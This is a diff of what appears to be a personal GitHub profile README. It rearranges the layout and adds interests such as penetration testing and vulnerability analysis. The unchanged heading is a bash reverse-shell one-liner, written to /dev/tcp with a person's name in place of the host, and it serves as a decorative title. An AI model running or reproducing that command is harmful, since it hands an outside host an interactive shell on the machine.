@@ -1,24 +1,26 @@
  <h1 align="center"> /bin/bash -i >& /dev/tcp/Sandra.Costales/444 0>&1 </h1>
 
 
-<table><tr><td valign="top" width="50%">
+<p align="left">
+  
+  <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExeDgzMmtzamtpeTB6cmF3aHZ2NmNyM3JyYzlhcG5uaHRjd3JuNTJ4cyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/oYQ9HRm5Mo7VXeMNVR/giphy.gif" alt="image" width="450" align="right">
+  </p>
 
 - 💻 Systems Administration
 
-- 🔐 Cybersecurity
+- 🔐 Network Security
 
 - 🌐 Computer Network Systems
 
+- 🔒 Ethical Hacking
 
+- 📡 Network Monitoring
 
+- 💾 Data Backup and Recovery
 
-</td><td valign="top" width="50%">
-<div align="center">
-<img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExeDgzMmtzamtpeTB6cmF3aHZ2NmNyM3JyYzlhcG5uaHRjd3JuNTJ4cyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/oYQ9HRm5Mo7VXeMNVR/giphy.gif" align="center" style="width: 100%" />
-</div>
+- 🛡️ Penetration Testing
 
-</td></tr></table>  
-<br/>
+- 🔍Vulnerability Analysis 
 
 <h1> Skills :</h1>
 
